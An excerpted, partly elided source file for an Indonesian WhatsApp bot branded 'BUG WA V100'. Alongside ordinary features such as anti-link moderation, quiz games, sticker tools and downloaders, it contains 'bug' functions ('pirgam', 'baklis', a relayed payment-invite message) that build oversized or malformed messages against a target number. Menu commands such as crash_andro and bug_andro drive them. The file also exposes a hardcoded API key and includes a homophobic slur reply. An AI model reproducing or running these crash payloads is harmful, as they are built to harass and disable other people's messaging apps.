...
const { UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader.js')
...
let afk = require("./lib/afk.js") //afk
...
//=================================================//
module.exports = yoshcss = async (yoshcss, m, chatUpdate, store) => {
try {
var body = (
...
//User
const botNumber = await yoshcss.decodeJid(yoshcss.user.id)
...
// Group
const groupMetadata = m.isGroup ? await yoshcss.groupMetadata(m.chat).catch(e => {}) : ''
...
await yoshcss.readMessages([readkey]);
}
yoshcss.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
yoshcss.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
yoshcss.sendPresenceUpdate('recording', m.chat)
}
}
...
await yoshcss.updateProfileStatus(`✳️ wkwkyosh || ✅ Runtime : ${uptime}`)
...
if (m.message) {
yoshcss.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
...
await yoshcss.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
await yoshcss.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
...
yoshreply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}
...
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
yoshreply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//=================================================//
//Status
if (!yoshcss.public) {
...
let { key } = await yoshcss.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await yoshcss.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}
...
return yoshcss.sendMessage(m.chat, {
contextInfo: {
...
if (!isBotAdmins) return yoshreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await yoshcss.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return yoshcss.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return yoshcss.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return yoshcss.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await yoshcss.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
...
if (isAdmins) return yoshreply(bvl)
if (mek.key.fromMe) return yoshreply(bvl)
if (isDeveloper) return yoshreply(bvl)
kice = m.sender
await yoshcss.sendMessage(m.chat,
{
delete: {
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by PUKI
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return yoshreply(mess.botAdmin)
  await yoshcss.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
...
await yoshcss.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by PUKI
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by PUKI
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by PUKI
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by PUKI
if (AntiLinkFacebook)
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by PUKI
if (AntiLinkTelegram)
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by PUKI
if (AntiLinkTiktok)
...
/*yoshcss.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
yoshcss.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by PUKI
if (AntiLinkTwitter)
...
//antilink all by geekz and modified by PUKI
if (AntiLinkAll)
...
await yoshreply('*Anda Telah menyerah*')
delete tebakgambar[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await yoshcss.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshreply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
await yoshcss.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else yoshreply('*Jawaban Salah!*')
}
...
if (room.x !== room.o) yoshcss.sendText(room.x, str, m, {
mentions: parseMention(str)
})
yoshcss.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
...
yoshreply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
}
}
...
yoshcss.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}
...
yoshcss.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
...
yoshcss.sendText(m.chat, `Suit telah dikirimkan ke chat
...
if (!roof.pilih) yoshcss.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) yoshcss.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) yoshcss.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
yoshcss.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
...
roof.text = m.text
yoshreply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) yoshcss.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
yoshreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) yoshcss.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
...
yoshcss.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
await yoshcss.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
...
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰PUKI PUKI PUKI",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: yoshcss.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #yoshcssdominate"
      },
      nativeFlowMessage: {
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ SADAR TOLOL 々"+" ".repeat(920000),
...
if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return yoshreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}
...
// Status
case 'public': {
if (!isPremium) return yoshreply(mess.premium) 
yoshcss.public = true
yoshreply('succes')
}
break
...
BUG WA V100 😂
Type : Plugins
Mode : ${yoshcss.public ? '𝖯𝗎𝖻𝗅𝗂𝖼' : '✲ Self ༣'}
User : ${Object.keys(db.data.users).length}
Prefix : All


By wkwkyosh © Copyright`
...
yoshcss.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
yoshcss.relayMessage(m.chat, freesex, {})
}
...
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${yoshcss.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┗❐
...
┃⭔ ${prefix}strava 62878###
┃⭔ ${prefix}qio 62878###
┃⭔ ${prefix}qiogasken 62878###
┃⭔ ${prefix}qiosepele 62878###
┃⭔ ${prefix}qioanjay 62878###
┃⭔ ${prefix}crash_andro 62878###
┃⭔ ${prefix}bug_andro 62878###
┃⭔ ${prefix}qioanjay 62878###
┃⭔ ${prefix}qioanjay 62878###
┃⭔ ${prefix}1shoot 62878###
┃⭔ ${prefix}mimir 62878###
...
penis = fs.readFileSync("./yoshcss.js").toString(),
...
//=================================================//
case 'sc': case 'script': {
yoshreply(`🌤️Sc Ini Dibuat Oleh By wkwkyosh.
...
yoshreply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.
...
yoshcss.sendMessage(m.chat, { text: `kenapa?`}, { quoted: ryobug })
}
break
*/
case 'shutdown': {
if (!isDeveloper) return yoshreply(mess.owner)
yoshreply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break
...
yoshreply(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//=================================================//
case "getname": {
...
var name = await yoshcss.getName(q)
}
yoshreply(name)
} else {
yoshreply(m.pushName)
}
}
break
//=================================================//
...
if (Input) {
try {
var ppWong = await yoshcss.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
yoshcss.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await yoshcss.profilePictureUrl(m.sender, "image")
} catch {
...
case 'changemenu':
if (!isDeveloper) return yoshreply(mess.owner)
if (args.length < 1) return yoshreply(`Example ${prefix + command} button/non`)
if (q == 'button') {
db.data.settings[botNumber].menuType = 'buttonImage'
yoshreply(`Successfully Changed Menu To Button List Image`)
} else if (q == 'non') {
db.data.settings[botNumber].menuType = 'externalImage'
yoshreply(`Successfully Changed Auto Typing To External Image`)
}
break
//=================================================//
case 'autorecord':
if (!isDeveloper) return yoshreply(mess.owner)
if (args.length < 1) return yoshreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
yoshreply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
...
yoshreply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
...
yoshreply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
...
yoshreply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
...
yoshreply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
...
case 'join': {
if (!isDeveloper) return yoshreply(mess.owner)
if (!text) return yoshreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
yoshreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await yoshcss.groupAcceptInvite(result).then((res) => yoshreply(jsonformat(res))).catch((err) => yoshreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
if (!isDeveloper) return yoshreply(mess.owner)
yoshcss.public = false
yoshreply('succes')
}
break
//=================================================//
...
if(users){
await yoshcss.updateBlockStatus(users, "block")
yoshreply(`Sukses block user`)
} else {
yoshreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return yoshreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return yoshreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await yoshcss.updateBlockStatus(woke, "block")
} else if(!q){
yoshreply("Masukan nomer yang ingin di block")
}
yoshreply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
//=================================================//
case 'unblock':
...
if(isGroup){
if(users){
await yoshcss.updateBlockStatus(users, "unblock")
await yoshreply(`Sukses unblock user`)
} else if(!q){
yoshreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
...
if(woke.startsWith("08")) return yoshreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return yoshreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await yoshcss.updateBlockStatus(woke, "unblock")
yoshreply(`Sukses unblock ${woke}`)
} else if(!q){
yoshreply("Masukan nomer yang ingin di unblock")
}
...
//=================================================//
case 'listblock':{
let block = await yoshcss.fetchBlocklist()
yoshreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot':{
if (!isDeveloper) return yoshreply(mess.owner);
if(m.quoted){
const media = await yoshcss.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await yoshcss.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await yoshreply(`${mess.success}`)
} else yoshreply("Reply fotonya")
}
break
//=================================================//
case 'delppbot': {
if (!isDeveloper) return yoshreply(mess.owner);
yoshcss.removeProfilePicture(yoshcss.user.id)
yoshreply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isDeveloper) return yoshreply(mess.owner);
if (!q) return yoshreply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await yoshcss.updateProfileStatus(q)
await yoshreply(`Berhasil mengganti status bio ke *${q}*`)
}
break
//=================================================//
case 'listpc': {
...
case "addcase": {
if (!isDeveloper) return yoshreply(mess.owner);
if (!q) return yoshreply(`Masukan Input`);
if (!q.includes("|")) return yoshreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./yoshcss.js", "utf-8");
...
fs.writeFileSync("./yoshcss.js", fileContent, "utf-8");

yoshreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
yoshreply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isDeveloper) return yoshreply(mess.owner);
if (!q) return yoshreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");
...
yoshreply(`Case "${caseName}" berhasil dihapus!`);
} else {
yoshreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
case 'iniryo' : {
yoshcss.sendMessage(m.chat, { text: `_ryo itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
yoshcss.sendMessage(m.chat, { text: `Hoekkkkkkk🤮🤮🤮. najis ada gay, mati aja lu kontol🤢` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return yoshreply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return yoshreply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await yoshcss.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
...
//=================================================//
case "emojimix2": {
if (!text) return yoshreply(`*Example: ${prefix+command} 😅*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await yoshcss.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break
...
if (!text) return yoshreply('Enter Query text!')
...
case 'stiker':
case 's':{
if (!quoted) return yoshreply(`Balas Video/Image Dengan Caption ${prefix + command}`)
yoshreply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await yoshcss.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return yoshreply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await yoshcss.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return yoshreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
 if (!text) return yoshreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return yoshreply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
yoshreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await yoshcss.downloadAndSaveMediaMessage(qmsg)
...
let pop = await yoshcss.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
...
case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return yoshreply(`Reply sticker dengan caption *${prefix + command}*`)
yoshreply(mess.wait)
let media = await yoshcss.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
yoshcss.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
...
case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) yoshreply(`yoshreply stiker dengan caption *${prefix + command}*`)
yoshreply(mess.wait)
var media = await yoshcss.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
yoshcss.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
...
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return yoshreply(`Kirim/yoshreply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
yoshreply(mess.wait)
let media = await yoshcss.downloadMediaMessage(qmsg)
...
//=================================================//
case 'attp':{
 if (!text) return yoshreply(`❗Gagitu Bego, Nih Gw Ajarin\n${prefix + command} RyoCakep`)
let lubangtile = `https://aemt.me/attp?text=${q}`
await yoshcss.sendVideoAsSticker(m.chat, lubangtile, m, {
packname: global.packname,
author: global.author
})
}
...
if (!text) return yoshreply(`*Example: ${prefix+command} https://youtube.com/@RendiWangsaff*`)
...
if (!quoted) return yoshreply(`Fotonya Mana?`)
if (!/image/.test(mime)) return yoshreply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
yoshreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
yoshcss.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
//=================================================//
case 'git': case 'gitclone': {
if (!args[0]) return yoshreply(`Mana link nya?\nContoh :\n${prefix ? prefix : '.'}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return yoshreply(`Link invalid!!`)
await yoshreply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
yoshcss.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => yoshreply(err))
}   
break
//=================================================//
case 'mediafire': {
if (!text) return yoshreply(`Gunakan dengan cara ${prefix + command} *url*`)
yoshreply(mess.wait)
let anu = await fetchJson(`https://aemt.me/mediafire?link=${q}`)
let hasdl = anu.result.link
let namafile = anu.result.title
yoshcss.sendMessage(m.chat, { document: { url: hasdl }, fileName: namafile, mimetype: '*/*' }, { quoted: m })
}
break
//=================================================//
case 'igdlmp4': {
...
//=================================================//
case 'happymod':{
if (!q) return yoshreply(`Example ${prefix+command} Sufway surfer mod`)
yoshreply (mess.wait)
let kat = await scp1.happymod(q)
yoshreply (util.format(kat))
}
break
//=================================================//
case 'play': 
...
case 'playmusik':
case 'playmusic': {
if (!q) return yoshreply("Kirim perintah judul lagu/link youtube nya bwang")
try {
let rus = await yts(q)
if (rus.all.length == "0") return yoshreply("Video tidak bisa di download")
...
yoshcss.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
...
case 'youtubemp3':
case 'youtubeaudio':{
if(!q) return yoshreply(`Contoh : ${prefix+command} Link`)
await yoshreply(mess.wait)
downloadMp3(text)
}
break
...
case 'tiktok':
case 'tiktokvideo': {
if (!text) return yoshreply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return yoshreply(`Link Invalid!!`)
await yoshreply(mess.wait)
var anu = await fetchJson(`https://aemt.me/download/tiktokdl?url=${q}`)
yoshcss.sendMessage(m.chat, { video: { url: anu.result.video }}, { quoted: m })
}
break
//=================================================//
case 'tiktokmp3':
case 'tiktokaudio': {
if (!text) return yoshreply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return yoshreply(`Link Invalid!!`)
await yoshreply(mess.wait)
require('./lib/tiktok.js').Tiktok(q).then( data => {
yoshcss.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
//=================================================//
...
//if (!teks1) return yoshreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
//if (!teks2) return yoshreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
yoshreply(mess.wait)
if (/image/.test(mime)) {
let media = await yoshcss.downloadMediaMessage(quoted)
let encmedia = await yoshcss.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return yoshreply('Maksimal 10 detik!')
let media = await yoshcss.downloadMediaMessage(qmsg)
let encmedia = await yoshcss.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return yoshreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
...
const nilai_two = Number(text.split("÷")[1])
yoshreply(`${nilai_one / nilai_two}`)
} else yoshreply(`*Example* : ${prefix + command} 1 + 1`)
}
break

//Openai
case "ai": case "chatgpt": case "openai": {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
yoshreply(json.result)
}
break
//=================================================//
case "gpt4": {
...
yoshreply(response.data.choices[0].message.content);
}
break
//=================================================//
case 'txt2img':{
if (!text) throw yoshreply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach')
yoshreply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://xzn.wtf/api/txt2img?text=${text}&apikey=${api.skijo}`)
await yoshcss.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
 } catch (e) {
yoshreply('Gagal Convert Gambar') 
}
}
break
//=================================================//
...
yoshcss.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
//=================================================//
case "prompt-gpt": {
if (!text) return yoshreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
...
//=================================================//
case "gptgo": {
if (!text) return yoshreply (`Example : ${m.prefix + m.command} Apa itu gpt go?`)
var js = await fetch(`https://aemt.me/gptgo?text=${q}`) 
var json = await js.json()
yoshreply(`Berikut Adalah Hasil Dari Gpt-Go \n\n\n\n\n ${json.result}`)
}
break
//=================================================//
case "dall-e": {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} Gunung Dengan Cuaca Hujan`)
...
//=================================================//
case "c-ai": {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
...
// Search
case 'google-search':
if (!q) return yoshreply (`Example : ${m.prefix + m.command} santet`)
...
yoshcss.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
